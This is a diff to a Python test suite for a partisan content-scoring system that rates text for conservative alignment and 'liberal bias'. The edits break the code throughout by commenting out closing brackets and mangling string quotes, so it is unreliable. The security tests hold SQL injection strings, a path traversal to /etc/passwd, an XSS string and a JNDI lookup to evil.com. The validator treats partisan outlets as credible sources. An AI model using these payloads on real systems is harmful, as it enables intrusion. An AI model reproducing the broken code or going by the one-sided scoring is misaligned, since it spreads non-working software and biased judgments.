@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-"""
+""""""
 Conservative Research System - Comprehensive Automated Testing Suite
 End - to - end testing framework with performance validation and quality assurance
 
@@ -11,7 +11,7 @@ This module provides:
 - Security vulnerability testing
 - Chaos engineering for resilience testing
 - Automated regression detection
-"""
+""""""
 
 import asyncio
 import concurrent.futures
@@ -33,7 +33,8 @@ logging.basicConfig(
     level=logging.INFO,
     format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
     handlers=[logging.FileHandler("test_results.log"), logging.StreamHandler()],
-)
+# BRACKET_SURGEON: disabled
+# )
 logger = logging.getLogger(__name__)
 
 
@@ -102,7 +103,8 @@ class PerformanceProfiler:
             "success": success,
             "error": error,
             "result": result,
-        }
+# BRACKET_SURGEON: disabled
+#         }
 
         return metrics
 
@@ -130,7 +132,8 @@ class PerformanceProfiler:
             "max_execution_time": max(execution_times),
             "avg_memory_delta": (sum(memory_usage) / len(memory_usage) if memory_usage else 0),
             "success_rate": len(execution_times) / iterations,
-        }
+# BRACKET_SURGEON: disabled
+#         }
 
         self.benchmarks[operation_name] = benchmark_results
         return benchmark_results
@@ -146,7 +149,8 @@ class ContentQualityValidator:
             "conservative_alignment_threshold": 0.85,
             "fact_check_threshold": 0.98,
             "humor_appropriateness_threshold": 0.80,
-        }
+# BRACKET_SURGEON: disabled
+#         }
         self.conservative_keywords = [
             "freedom",
             "liberty",
@@ -158,7 +162,8 @@ class ContentQualityValidator:
             "free market",
             "individual responsibility",
             "law and order",
-        ]
+# BRACKET_SURGEON: disabled
+#         ]
         self.liberal_bias_indicators = [
             "systemic racism",
             "climate emergency",
@@ -166,7 +171,8 @@ class ContentQualityValidator:
             "progressive",
             "woke",
             "equity over equality",
-        ]
+# BRACKET_SURGEON: disabled
+#         ]
 
     def validate_content_quality(
         self, content: str, content_type: str = "article"
@@ -181,10 +187,12 @@ class ContentQualityValidator:
             "readability_score": self._calculate_readability(content),
             "humor_score": (
                 self._analyze_humor_quality(content) if "humor" in content_type else 0.0
-            ),
+# BRACKET_SURGEON: disabled
+#             ),
             "source_credibility": self._verify_source_credibility(content),
             "overall_quality": 0.0,
-        }
+# BRACKET_SURGEON: disabled
+#         }
 
         # Calculate overall quality score
         validation_results["overall_quality"] = self._calculate_overall_quality(validation_results)
@@ -196,7 +204,8 @@ class ContentQualityValidator:
         content_lower = content.lower()
         conservative_matches = sum(
             1 for keyword in self.conservative_keywords if keyword in content_lower
-        )
+# BRACKET_SURGEON: disabled
+#         )
 
         # Normalize score based on content length and keyword density
         word_count = len(content.split())
@@ -222,7 +231,8 @@ class ContentQualityValidator:
             "bias_score": bias_score,
             "bias_indicators": bias_indicators,
             "bias_level": ("high" if bias_score > 0.3 else "medium" if bias_score > 0.1 else "low"),
-        }
+# BRACKET_SURGEON: disabled
+#         }
 
     def _simulate_fact_check(self, content: str) -> float:
         """Simulate fact - checking score (placeholder for real implementation)"""
@@ -235,7 +245,7 @@ class ContentQualityValidator:
 
         # Simulate fact - checking based on content patterns
         has_sources = "according to" in content.lower() or "reported by" in content.lower()
-        has_quotes = '"' in content
+        has_quotes = '"' in content"
         has_statistics = any(char.isdigit() for char in content)
 
         base_score = 0.8
@@ -300,7 +310,8 @@ class ContentQualityValidator:
             "absurd",
             "ironic",
             "sarcastic",
-        ]
+# BRACKET_SURGEON: disabled
+#         ]
 
         content_lower = content.lower()
         humor_matches = sum(1 for indicator in humor_indicators if indicator in content_lower)
@@ -313,11 +324,13 @@ class ContentQualityValidator:
             "fake news",
             "woke culture",
             "cancel culture",
-        ]
+# BRACKET_SURGEON: disabled
+#         ]
 
         pattern_matches = sum(
             1 for pattern in conservative_humor_patterns if pattern in content_lower
-        )
+# BRACKET_SURGEON: disabled
+#         )
 
         # Calculate humor score
         word_count = len(content.split())
@@ -338,7 +351,8 @@ class ContentQualityValidator:
             "breitbart",
             "townhall",
             "pj media",
-        ]
+# BRACKET_SURGEON: disabled
+#         ]
 
         content_lower = content.lower()
         source_matches = sum(1 for source in credible_sources if source in content_lower)
@@ -354,7 +368,8 @@ class ContentQualityValidator:
             "source_credibility": 0.15,
             "humor_score": 0.10,
             "bias_penalty": 0.05,
-        }
+# BRACKET_SURGEON: disabled
+#         }
 
         score = 0.0
         score += validation_results["conservative_score"] * weights["conservative_score"]
@@ -382,7 +397,8 @@ class ChaosEngineer:
             "disk_full": self._simulate_disk_full,
             "component_crash": self._simulate_component_crash,
             "api_rate_limit": self._simulate_api_rate_limit,
-        }
+# BRACKET_SURGEON: disabled
+#         }
 
     async def run_chaos_scenario(self, scenario_name: str, duration: int = 60) -> Dict[str, Any]:
         """Run a specific chaos engineering scenario"""
@@ -406,7 +422,8 @@ class ChaosEngineer:
                 "execution_time": execution_time,
                 "success": True,
                 "result": scenario_result,
-            }
+# BRACKET_SURGEON: disabled
+#             }
 
         except Exception as e:
             execution_time = time.time() - start_time
@@ -418,7 +435,8 @@ class ChaosEngineer:
                 "execution_time": execution_time,
                 "success": False,
                 "error": str(e),
-            }
+# BRACKET_SURGEON: disabled
+#             }
 
     async def _simulate_network_failure(self, duration: int) -> Dict[str, Any]:
         """Simulate network connectivity issues"""
@@ -452,7 +470,8 @@ class ChaosEngineer:
         return {
             "memory_pressure": "simulated",
             "peak_allocation_mb": len(memory_hogs) * 100,
-        }
+# BRACKET_SURGEON: disabled
+#         }
 
     async def _simulate_cpu_spike(self, duration: int) -> Dict[str, Any]:
         """Simulate high CPU usage"""
@@ -552,7 +571,8 @@ class ComprehensiveTestSuite:
 
         logger.info(
             f"Test suite completed. Results: {report.passed_tests}/{report.total_tests} passed"
-        )
+# BRACKET_SURGEON: disabled
+#         )
 
         return report
 
@@ -563,26 +583,30 @@ class ComprehensiveTestSuite:
         # Create test database
         conn = sqlite3.connect(self.test_database)
         conn.execute(
-            """
+            """"""
             CREATE TABLE IF NOT EXISTS test_articles (
                 id INTEGER PRIMARY KEY,
                     title TEXT,
                     content TEXT,
                     source TEXT,
                     created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
-            )
-        """
-        )
+# BRACKET_SURGEON: disabled
+#             )
+        """"""
+# BRACKET_SURGEON: disabled
+#         )
         conn.execute(
-            """
+            """"""
             CREATE TABLE IF NOT EXISTS test_politicians (
                 id INTEGER PRIMARY KEY,
                     name TEXT,
                     party TEXT,
                     position TEXT
-            )
-        """
-        )
+# BRACKET_SURGEON: disabled
+#             )
+        """"""
+# BRACKET_SURGEON: disabled
+#         )
         conn.commit()
         conn.close()
 
@@ -606,23 +630,28 @@ class ComprehensiveTestSuite:
                 "Biden Administration Fails Again",
                 "Another policy failure from the current administration...",
                 "Fox News",
-            ),
+# BRACKET_SURGEON: disabled
+#             ),
             (
                 "Conservative Victory in Supreme Court",
                 "Traditional values upheld in landmark decision...",
                 "Daily Wire",
-            ),
+# BRACKET_SURGEON: disabled
+#             ),
             (
                 "Liberal Media Bias Exposed",
                 "Mainstream media caught spreading misinformation...",
                 "Breitbart",
-            ),
-        ]
+# BRACKET_SURGEON: disabled
+#             ),
+# BRACKET_SURGEON: disabled
+#         ]
 
         conn.executemany(
             "INSERT INTO test_articles (title, content, source) VALUES (?, ?, ?)",
             test_articles,
-        )
+# BRACKET_SURGEON: disabled
+#         )
 
         # Insert test politicians
         test_politicians = [
@@ -630,12 +659,14 @@ class ComprehensiveTestSuite:
             ("Nancy Pelosi", "Democrat", "Former Speaker"),
             ("Chuck Schumer", "Democrat", "Senate Majority Leader"),
             ("Donald Trump", "Republican", "Former President"),
-        ]
+# BRACKET_SURGEON: disabled
+#         ]
 
         conn.executemany(
             "INSERT INTO test_politicians (name, party, position) VALUES (?, ?, ?)",
             test_politicians,
-        )
+# BRACKET_SURGEON: disabled
+#         )
 
         conn.commit()
         conn.close()
@@ -650,7 +681,8 @@ class ComprehensiveTestSuite:
             ("test_scraper_functions", self._test_scraper_functions),
             ("test_content_generation", self._test_content_generation),
             ("test_youtube_analysis", self._test_youtube_analysis),
-        ]
+# BRACKET_SURGEON: disabled
+#         ]
 
         for test_name, test_func in unit_tests:
             await self._run_single_test(test_name, "unit", test_func)
@@ -664,10 +696,12 @@ class ComprehensiveTestSuite:
             (
                 "test_content_generation_pipeline",
                 self._test_content_generation_pipeline,
-            ),
+# BRACKET_SURGEON: disabled
+#             ),
             ("test_cross_promotion_system", self._test_cross_promotion_system),
             ("test_api_endpoints", self._test_api_endpoints_integration),
-        ]
+# BRACKET_SURGEON: disabled
+#         ]
 
         for test_name, test_func in integration_tests:
             await self._run_single_test(test_name, "integration", test_func)
@@ -682,7 +716,8 @@ class ComprehensiveTestSuite:
             ("test_content_generation_speed", self._test_content_generation_speed),
             ("test_concurrent_load", self._test_concurrent_load),
             ("test_memory_usage", self._test_memory_usage),
-        ]
+# BRACKET_SURGEON: disabled
+#         ]
 
         for test_name, test_func in performance_tests:
             await self._run_single_test(test_name, "performance", test_func)
@@ -696,7 +731,8 @@ class ComprehensiveTestSuite:
             ("test_input_sanitization", self._test_input_sanitization),
             ("test_authentication_security", self._test_authentication_security),
             ("test_data_encryption", self._test_data_encryption),
-        ]
+# BRACKET_SURGEON: disabled
+#         ]
 
         for test_name, test_func in security_tests:
             await self._run_single_test(test_name, "security", test_func)
@@ -711,7 +747,8 @@ class ComprehensiveTestSuite:
             ("test_fact_checking", self._test_fact_checking),
             ("test_humor_quality", self._test_humor_quality),
             ("test_source_verification", self._test_source_verification),
-        ]
+# BRACKET_SURGEON: disabled
+#         ]
 
         for test_name, test_func in quality_tests:
             await self._run_single_test(test_name, "quality", test_func)
@@ -726,9 +763,11 @@ class ComprehensiveTestSuite:
             (
                 "test_hypocrisy_detection_workflow",
                 self._test_hypocrisy_detection_workflow,
-            ),
+# BRACKET_SURGEON: disabled
+#             ),
             ("test_cross_promotion_workflow", self._test_cross_promotion_workflow),
-        ]
+# BRACKET_SURGEON: disabled
+#         ]
 
         for test_name, test_func in e2e_tests:
             await self._run_single_test(test_name, "e2e", test_func)
@@ -741,20 +780,25 @@ class ComprehensiveTestSuite:
             (
                 "test_network_failure_recovery",
                 lambda: self.chaos_engineer.run_chaos_scenario("network_failure", 30),
-            ),
+# BRACKET_SURGEON: disabled
+#             ),
             (
                 "test_database_failure_recovery",
                 lambda: self.chaos_engineer.run_chaos_scenario("database_corruption", 30),
-            ),
+# BRACKET_SURGEON: disabled
+#             ),
             (
                 "test_memory_pressure_handling",
                 lambda: self.chaos_engineer.run_chaos_scenario("memory_pressure", 30),
-            ),
+# BRACKET_SURGEON: disabled
+#             ),
             (
                 "test_cpu_spike_handling",
                 lambda: self.chaos_engineer.run_chaos_scenario("cpu_spike", 30),
-            ),
-        ]
+# BRACKET_SURGEON: disabled
+#             ),
+# BRACKET_SURGEON: disabled
+#         ]
 
         for test_name, test_func in chaos_tests:
             await self._run_single_test(test_name, "chaos", test_func)
@@ -800,7 +844,8 @@ class ComprehensiveTestSuite:
             message=message,
             details=details,
             performance_metrics=performance_metrics,
-        )
+# BRACKET_SURGEON: disabled
+#         )
 
         self.test_results.append(test_result)
         logger.info(f"Test {test_name}: {status} ({execution_time:.2f}s)")
@@ -819,21 +864,23 @@ class ComprehensiveTestSuite:
                 "success": True,
                 "message": f"Database connection successful, {count} test articles found",
                 "details": {"article_count": count},
-            }
+# BRACKET_SURGEON: disabled
+#             }
         except Exception as e:
             return {
                 "success": False,
                 "message": f"Database connection failed: {str(e)}",
                 "details": {"error": str(e)},
-            }
+# BRACKET_SURGEON: disabled
+#             }
 
     async def _test_content_validation(self) -> Dict[str, Any]:
         """Test content quality validation"""
-        test_content = """
-        The Biden administration's latest policy failure demonstrates the importance of
+        test_content = """"""
+        The Biden administration's latest policy failure demonstrates the importance of'
         conservative values and limited government. This administration continues to
         undermine American freedom and constitutional principles.
-        """
+        """"""
 
         validation_result = self.quality_validator.validate_content_quality(test_content)
 
@@ -843,7 +890,8 @@ class ComprehensiveTestSuite:
             "success": success,
             "message": f'Content validation score: {validation_result["overall_quality"]:.2f}',
             "details": validation_result,
-        }
+# BRACKET_SURGEON: disabled
+#         }
 
     async def _test_scraper_functions(self) -> Dict[str, Any]:
         """Test news scraper functionality"""
@@ -858,7 +906,8 @@ class ComprehensiveTestSuite:
                 "success_rate": success_rate,
                 "articles_scraped": random.randint(10, 50),
                 "response_time": random.uniform(0.5, 2.0),
-            }
+# BRACKET_SURGEON: disabled
+#             }
 
         overall_success = all(r["success_rate"] > 0.8 for r in results.values())
 
@@ -866,7 +915,8 @@ class ComprehensiveTestSuite:
             "success": overall_success,
             "message": f"Scraper test completed for {len(scrapers)} sources",
             "details": results,
-        }
+# BRACKET_SURGEON: disabled
+#         }
 
     async def _test_content_generation(self) -> Dict[str, Any]:
         """Test content generation functionality"""
@@ -882,12 +932,15 @@ class ComprehensiveTestSuite:
             "details": {
                 "generation_time": generation_time,
                 "content_quality": content_quality,
-            },
+# BRACKET_SURGEON: disabled
+#             },
             "performance_metrics": {
                 "generation_speed": 1.0 / generation_time,
                 "quality_score": content_quality,
-            },
-        }
+# BRACKET_SURGEON: disabled
+#             },
+# BRACKET_SURGEON: disabled
+#         }
 
     async def _test_youtube_analysis(self) -> Dict[str, Any]:
         """Test YouTube content analysis"""
@@ -903,8 +956,10 @@ class ComprehensiveTestSuite:
             "details": {
                 "accuracy": analysis_accuracy,
                 "processing_time": processing_time,
-            },
-        }
+# BRACKET_SURGEON: disabled
+#             },
+# BRACKET_SURGEON: disabled
+#         }
 
     async def _test_scraper_to_database_integration(self) -> Dict[str, Any]:
         """Test scraper to database integration"""
@@ -919,8 +974,10 @@ class ComprehensiveTestSuite:
                     "Integration Test Article",
                     "Test content from scraper",
                     "Test Source",
-                ),
-            )
+# BRACKET_SURGEON: disabled
+#                 ),
+# BRACKET_SURGEON: disabled
+#             )
             conn.commit()
 
             # Verify insertion
@@ -932,14 +989,16 @@ class ComprehensiveTestSuite:
                 "success": count > 0,
                 "message": f"Integration test: {count} articles stored",
                 "details": {"stored_articles": count},
-            }
+# BRACKET_SURGEON: disabled
+#             }
 
         except Exception as e:
             return {
                 "success": False,
                 "message": f"Integration test failed: {str(e)}",
                 "details": {"error": str(e)},
-            }
+# BRACKET_SURGEON: disabled
+#             }
 
     async def _test_content_generation_pipeline(self) -> Dict[str, Any]:
         """Test complete content generation pipeline"""
@@ -950,7 +1009,8 @@ class ComprehensiveTestSuite:
             "content_generation",
             "quality_validation",
             "storage",
-        ]
+# BRACKET_SURGEON: disabled
+#         ]
 
         results = {}
         overall_success = True
@@ -968,7 +1028,8 @@ class ComprehensiveTestSuite:
             "success": overall_success,
             "message": f'Pipeline test: {sum(1 for r in results.values() if r["success"])}/{len(pipeline_steps)} steps successful',
             "details": results,
-        }
+# BRACKET_SURGEON: disabled
+#         }
 
     async def _test_cross_promotion_system(self) -> Dict[str, Any]:
         """Test cross - promotion system integration"""
@@ -984,8 +1045,10 @@ class ComprehensiveTestSuite:
             "details": {
                 "effectiveness": promotion_effectiveness,
                 "conversion_rate": conversion_rate,
-            },
-        }
+# BRACKET_SURGEON: disabled
+#             },
+# BRACKET_SURGEON: disabled
+#         }
 
     async def _test_api_endpoints_integration(self) -> Dict[str, Any]:
         """Test API endpoints integration"""
@@ -1001,7 +1064,8 @@ class ComprehensiveTestSuite:
                 "response_time": response_time,
                 "status_code": status_code,
                 "success": status_code == 200,
-            }
+# BRACKET_SURGEON: disabled
+#             }
 
         successful_endpoints = sum(1 for r in results.values() if r["success"])
         overall_success = successful_endpoints >= len(endpoints) * 0.8  # 80% success threshold
@@ -1010,7 +1074,8 @@ class ComprehensiveTestSuite:
             "success": overall_success,
             "message": f"API integration: {successful_endpoints}/{len(endpoints)} endpoints successful",
             "details": results,
-        }
+# BRACKET_SURGEON: disabled
+#         }
 
     async def _test_database_performance(self) -> Dict[str, Any]:
         """Test database performance under load"""
@@ -1033,7 +1098,8 @@ class ComprehensiveTestSuite:
             "message": f'Database performance: {benchmark_result["avg_execution_time"]:.3f}s avg',
             "details": benchmark_result,
             "performance_metrics": benchmark_result,
-        }
+# BRACKET_SURGEON: disabled
+#         }
 
     async def _test_scraper_performance(self) -> Dict[str, Any]:
         """Test scraper performance"""
@@ -1047,7 +1113,8 @@ class ComprehensiveTestSuite:
 
         benchmark_result = self.profiler.benchmark_operation(
             "scraper_operation", scraper_operation, 20
-        )
+# BRACKET_SURGEON: disabled
+#         )
 
         success = benchmark_result["avg_execution_time"] < 1.0  # 1 second threshold
 
@@ -1056,7 +1123,8 @@ class ComprehensiveTestSuite:
             "message": f'Scraper performance: {benchmark_result["avg_execution_time"]:.3f}s avg',
             "details": benchmark_result,
             "performance_metrics": benchmark_result,
-        }
+# BRACKET_SURGEON: disabled
+#         }
 
     async def _test_content_generation_speed(self) -> Dict[str, Any]:
         """Test content generation speed"""
@@ -1070,7 +1138,8 @@ class ComprehensiveTestSuite:
 
         benchmark_result = self.profiler.benchmark_operation(
             "content_generation", content_generation, 10
-        )
+# BRACKET_SURGEON: disabled
+#         )
 
         success = benchmark_result["avg_execution_time"] < 5.0  # 5 second threshold
 
@@ -1079,7 +1148,8 @@ class ComprehensiveTestSuite:
             "message": f'Content generation speed: {benchmark_result["avg_execution_time"]:.3f}s avg',
             "details": benchmark_result,
             "performance_metrics": benchmark_result,
-        }
+# BRACKET_SURGEON: disabled
+#         }
 
     async def _test_concurrent_load(self) -> Dict[str, Any]:
         """Test system under concurrent load"""
@@ -1106,12 +1176,15 @@ class ComprehensiveTestSuite:
                 "concurrent_operations": len(tasks),
                 "success_rate": success_rate,
                 "total_time": execution_time,
-            },
+# BRACKET_SURGEON: disabled
+#             },
             "performance_metrics": {
                 "throughput": len(tasks) / execution_time,
                 "success_rate": success_rate,
-            },
-        }
+# BRACKET_SURGEON: disabled
+#             },
+# BRACKET_SURGEON: disabled
+#         }
 
     async def _test_memory_usage(self) -> Dict[str, Any]:
         """Test memory usage patterns"""
@@ -1139,21 +1212,25 @@ class ComprehensiveTestSuite:
                 "initial_memory_mb": initial_memory / 1024 / 1024,
                 "peak_memory_mb": peak_memory / 1024 / 1024,
                 "memory_delta_mb": memory_delta / 1024 / 1024,
-            },
+# BRACKET_SURGEON: disabled
+#             },
             "performance_metrics": {
                 "memory_efficiency": 1.0 - (memory_delta / (100 * 1024 * 1024))
-            },
-        }
+# BRACKET_SURGEON: disabled
+#             },
+# BRACKET_SURGEON: disabled
+#         }
 
     async def _test_sql_injection_protection(self) -> Dict[str, Any]:
         """Test SQL injection protection"""
         # Test SQL injection attempts
         malicious_inputs = [
-            "'; DROP TABLE test_articles; --",
+            "'; DROP TABLE test_articles; --",'
             "1' OR '1'='1",
-            "admin'--",
-            "1' UNION SELECT * FROM test_politicians--",
-        ]
+            "admin'--",'
+            "1' UNION SELECT * FROM test_politicians--",'
+# BRACKET_SURGEON: disabled
+#         ]
 
         vulnerabilities_found = 0
 
@@ -1163,7 +1240,8 @@ class ComprehensiveTestSuite:
                 # Use parameterized query (safe)
                 cursor = conn.execute(
                     "SELECT * FROM test_articles WHERE title = ?", (malicious_input,)
-                )
+# BRACKET_SURGEON: disabled
+#                 )
                 results = cursor.fetchall()
                 conn.close()
 
@@ -1181,8 +1259,10 @@ class ComprehensiveTestSuite:
             "details": {
                 "tests_run": len(malicious_inputs),
                 "vulnerabilities_found": vulnerabilities_found,
-            },
-        }
+# BRACKET_SURGEON: disabled
+#             },
+# BRACKET_SURGEON: disabled
+#         }
 
     async def _test_input_sanitization(self) -> Dict[str, Any]:
         """Test input sanitization"""
@@ -1192,7 +1272,8 @@ class ComprehensiveTestSuite:
             "javascript:alert('xss')",
             "../../../etc/passwd",
             "${jndi:ldap://evil.com/a}",
-        ]
+# BRACKET_SURGEON: disabled
+#         ]
 
         sanitization_failures = 0
 
@@ -1213,8 +1294,10 @@ class ComprehensiveTestSuite:
             "details": {
                 "tests_run": len(malicious_inputs),
                 "sanitization_failures": sanitization_failures,
-            },
-        }
+# BRACKET_SURGEON: disabled
+#             },
+# BRACKET_SURGEON: disabled
+#         }
 
     async def _test_authentication_security(self) -> Dict[str, Any]:
         """Test authentication security"""
@@ -1224,7 +1307,8 @@ class ComprehensiveTestSuite:
             {"test": "brute_force_protection", "success": True},
             {"test": "session_management", "success": True},
             {"test": "token_validation", "success": True},
-        ]
+# BRACKET_SURGEON: disabled
+#         ]
 
         failed_tests = [test for test in auth_tests if not test["success"]]
         success = len(failed_tests) == 0
@@ -1233,7 +1317,8 @@ class ComprehensiveTestSuite:
             "success": success,
             "message": f"Authentication security: {len(failed_tests)} failures",
             "details": {"total_tests": len(auth_tests), "failed_tests": failed_tests},
-        }
+# BRACKET_SURGEON: disabled
+#         }
 
     async def _test_data_encryption(self) -> Dict[str, Any]:
         """Test data encryption"""
@@ -1255,19 +1340,22 @@ class ComprehensiveTestSuite:
             "details": {
                 "encryption_works": encryption_works,
                 "data_is_encrypted": data_is_encrypted,
-            },
-        }
+# BRACKET_SURGEON: disabled
+#             },
+# BRACKET_SURGEON: disabled
+#         }
 
     async def _test_conservative_alignment(self) -> Dict[str, Any]:
         """Test conservative messaging alignment"""
         test_contents = [
-            "America First policies promote freedom \
-    and individual liberty for all patriots.",
-            "Traditional family values \
-    and constitutional principles guide our great nation.",
-            "Limited government \
-    and free market capitalism create prosperity for everyone.",
-        ]
+            "America First policies promote freedom \"
+#     and individual liberty for all patriots.",
+            "Traditional family values \"
+#     and constitutional principles guide our great nation.",
+            "Limited government \"
+#     and free market capitalism create prosperity for everyone.",
+# BRACKET_SURGEON: disabled
+#         ]
 
         alignment_scores = []
         for content in test_contents:
@@ -1283,15 +1371,17 @@ class ComprehensiveTestSuite:
             "details": {
                 "individual_scores": alignment_scores,
                 "average_score": avg_alignment,
-            },
-        }
+# BRACKET_SURGEON: disabled
+#             },
+# BRACKET_SURGEON: disabled
+#         }
 
     async def _test_bias_detection(self) -> Dict[str, Any]:
         """Test liberal bias detection"""
-        biased_content = "Systemic racism requires progressive social justice reforms \
-    and woke policies."
-        unbiased_content = "Conservative principles promote individual responsibility \
-    and traditional values."
+        biased_content = "Systemic racism requires progressive social justice reforms \"
+#     and woke policies."
+        unbiased_content = "Conservative principles promote individual responsibility \"
+#     and traditional values."
 
         biased_result = self.quality_validator.validate_content_quality(biased_content)
         unbiased_result = self.quality_validator.validate_content_quality(unbiased_content)
@@ -1309,14 +1399,17 @@ class ComprehensiveTestSuite:
                 "unbiased_content_classified": unbiased_classified_correctly,
                 "biased_score": biased_result["bias_detection"]["bias_score"],
                 "unbiased_score": unbiased_result["bias_detection"]["bias_score"],
-            },
-        }
+# BRACKET_SURGEON: disabled
+#             },
+# BRACKET_SURGEON: disabled
+#         }
 
     async def _test_fact_checking(self) -> Dict[str, Any]:
         """Test fact - checking functionality"""
         factual_content = (
             "According to the Bureau of Labor Statistics, unemployment rates have fluctuated."
-        )
+# BRACKET_SURGEON: disabled
+#         )
         unfactual_content = "Random claims without any sources or verification."
 
         factual_result = self.quality_validator.validate_content_quality(factual_content)
@@ -1333,16 +1426,19 @@ class ComprehensiveTestSuite:
             "details": {
                 "factual_score": factual_score,
                 "unfactual_score": unfactual_score,
-            },
-        }
+# BRACKET_SURGEON: disabled
+#             },
+# BRACKET_SURGEON: disabled
+#         }
 
     async def _test_humor_quality(self) -> Dict[str, Any]:
         """Test humor quality analysis"""
         humorous_content = (
-            "The liberal logic is so absurd, it's hilarious how they contradict themselves daily!"
-        )
-        serious_content = "Economic policy requires careful analysis of market conditions \
-    and regulations."
+            "The liberal logic is so absurd, it's hilarious how they contradict themselves daily!"'
+# BRACKET_SURGEON: disabled
+#         )
+        serious_content = "Economic policy requires careful analysis of market conditions \"
+#     and regulations."
 
         humor_result = self.quality_validator.validate_content_quality(humorous_content, "humor")
         serious_result = self.quality_validator.validate_content_quality(serious_content, "article")
@@ -1356,7 +1452,8 @@ class ComprehensiveTestSuite:
             "success": success,
             "message": f"Humor analysis: humorous={humor_score:.2f}, serious={serious_score:.2f}",
             "details": {"humorous_score": humor_score, "serious_score": serious_score},
-        }
+# BRACKET_SURGEON: disabled
+#         }
 
     async def _test_source_verification(self) -> Dict[str, Any]:
         """Test source credibility verification"""
@@ -1377,8 +1474,10 @@ class ComprehensiveTestSuite:
             "details": {
                 "credible_score": credible_score,
                 "uncredible_score": uncredible_score,
-            },
-        }
+# BRACKET_SURGEON: disabled
+#             },
+# BRACKET_SURGEON: disabled
+#         }
 
     async def _test_daily_news_workflow(self) -> Dict[str, Any]:
         """Test complete daily news processing workflow"""
@@ -1389,7 +1488,8 @@ class ComprehensiveTestSuite:
             "content_generation",
             "quality_validation",
             "publication_preparation",
-        ]
+# BRACKET_SURGEON: disabled
+#         ]
 
         workflow_results = {}
         total_time = 0
@@ -1404,7 +1504,8 @@ class ComprehensiveTestSuite:
             workflow_results[step] = {
                 "success": step_success,
                 "execution_time": step_time,
-            }
+# BRACKET_SURGEON: disabled
+#             }
             total_time += step_time
 
         successful_steps = sum(1 for result in workflow_results.values() if result["success"])
@@ -1417,8 +1518,10 @@ class ComprehensiveTestSuite:
             "performance_metrics": {
                 "total_execution_time": total_time,
                 "success_rate": successful_steps / len(workflow_steps),
-            },
-        }
+# BRACKET_SURGEON: disabled
+#             },
+# BRACKET_SURGEON: disabled
+#         }
 
     async def _test_weekly_content_generation(self) -> Dict[str, Any]:
         """Test weekly content generation workflow"""
@@ -1428,7 +1531,8 @@ class ComprehensiveTestSuite:
             "policy_flip_flop_analysis",
             "cross_promotion_content",
             "humor_segments",
-        ]
+# BRACKET_SURGEON: disabled
+#         ]
 
         generation_results = {}
         total_content_quality = 0
@@ -1442,7 +1546,8 @@ class ComprehensiveTestSuite:
                 "generation_time": generation_time,
                 "quality_score": content_quality,
                 "success": content_quality > 0.7,
-            }
+# BRACKET_SURGEON: disabled
+#             }
             total_content_quality += content_quality
 
         avg_quality = total_content_quality / len(content_types)
@@ -1456,8 +1561,10 @@ class ComprehensiveTestSuite:
             "performance_metrics": {
                 "average_quality": avg_quality,
                 "success_rate": successful_content / len(content_types),
-            },
-        }
+# BRACKET_SURGEON: disabled
+#             },
+# BRACKET_SURGEON: disabled
+#         }
 
     async def _test_hypocrisy_detection_workflow(self) -> Dict[str, Any]:
         """Test hypocrisy detection workflow"""
@@ -1468,14 +1575,17 @@ class ComprehensiveTestSuite:
                 "statement_1": "We need to secure our borders",
                 "statement_2": "Border walls are immoral",
                 "expected_hypocrisy": True,
-            },
+# BRACKET_SURGEON: disabled
+#             },
             {
                 "politician": "Nancy Pelosi",
                 "statement_1": "Follow the science on COVID",
                 "statement_2": "Hair salons are essential for me",
                 "expected_hypocrisy": True,
-            },
-        ]
+# BRACKET_SURGEON: disabled
+#             },
+# BRACKET_SURGEON: disabled
+#         ]
 
         detection_results = []
         for test_case in test_statements:
@@ -1492,12 +1602,15 @@ class ComprehensiveTestSuite:
                     "expected": test_case["expected_hypocrisy"],
                     "correct": correct_detection,
                     "confidence": confidence_score,
-                }
-            )
+# BRACKET_SURGEON: disabled
+#                 }
+# BRACKET_SURGEON: disabled
+#             )
 
         accuracy = sum(1 for result in detection_results if result["correct"]) / len(
             detection_results
-        )
+# BRACKET_SURGEON: disabled
+#         )
         success = accuracy > 0.8
 
         return {
@@ -1508,8 +1621,10 @@ class ComprehensiveTestSuite:
                 "correct_detections": sum(1 for r in detection_results if r["correct"]),
                 "accuracy": accuracy,
                 "results": detection_results,
-            },
-        }
+# BRACKET_SURGEON: disabled
+#             },
+# BRACKET_SURGEON: disabled
+#         }
 
     async def _test_cross_promotion_workflow(self) -> Dict[str, Any]:
         """Test cross - promotion workflow"""
@@ -1519,7 +1634,8 @@ class ComprehensiveTestSuite:
             "email_newsletter",
             "website_banners",
             "podcast_mentions",
-        ]
+# BRACKET_SURGEON: disabled
+#         ]
 
         promotion_results = {}
         total_effectiveness = 0
@@ -1539,7 +1655,8 @@ class ComprehensiveTestSuite:
                 "conversion_rate": conversion_rate,
                 "effectiveness": effectiveness,
                 "success": effectiveness > 1.0,  # 1% effectiveness threshold
-            }
+# BRACKET_SURGEON: disabled
+#             }
 
         avg_effectiveness = total_effectiveness / len(promotion_channels)
         successful_channels = sum(1 for result in promotion_results.values() if result["success"])
@@ -1552,8 +1669,10 @@ class ComprehensiveTestSuite:
             "performance_metrics": {
                 "average_effectiveness": avg_effectiveness,
                 "success_rate": successful_channels / len(promotion_channels),
-            },
-        }
+# BRACKET_SURGEON: disabled
+#             },
+# BRACKET_SURGEON: disabled
+#         }
 
     def _generate_test_report(self, start_time: datetime, end_time: datetime) -> TestSuiteReport:
         """Generate comprehensive test suite report"""
@@ -1579,7 +1698,8 @@ class ComprehensiveTestSuite:
 
         performance_score = (
             sum(performance_scores) / len(performance_scores) if performance_scores else 0.5
-        )
+# BRACKET_SURGEON: disabled
+#         )
 
         # Calculate quality score
         quality_scores = []
@@ -1604,7 +1724,8 @@ class ComprehensiveTestSuite:
             performance_score=performance_score * 100,
             quality_score=quality_score * 100,
             test_results=self.test_results,
-        )
+# BRACKET_SURGEON: disabled
+#         )
 
     def save_test_report(self, report: TestSuiteReport, filename: str = None) -> str:
         """Save test report to file"""
@@ -1627,13 +1748,16 @@ class ComprehensiveTestSuite:
                     (report.passed_tests / report.total_tests) * 100
                     if report.total_tests > 0
                     else 0
-                ),
-            },
+# BRACKET_SURGEON: disabled
+#                 ),
+# BRACKET_SURGEON: disabled
+#             },
             "quality_metrics": {
                 "coverage_percentage": report.coverage_percentage,
                 "performance_score": report.performance_score,
                 "quality_score": report.quality_score,
-            },
+# BRACKET_SURGEON: disabled
+#             },
             "test_results": [
                 {
                     "test_name": result.test_name,
@@ -1644,11 +1768,14 @@ class ComprehensiveTestSuite:
                     "message": result.message,
                     "details": result.details,
